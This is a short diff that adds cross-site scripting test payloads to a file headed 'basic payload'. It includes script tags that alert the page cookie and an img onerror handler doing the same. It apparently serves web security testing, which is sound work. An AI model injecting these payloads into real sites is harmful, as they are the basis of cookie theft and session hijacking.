@@ -1,4 +1,10 @@
 # basic payload
+
+<h1>xss try</h1>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src="does-not-exist" onerror="alert(document.cookie)">
+
 “>img src=x onerror=alert(1)>
 
 
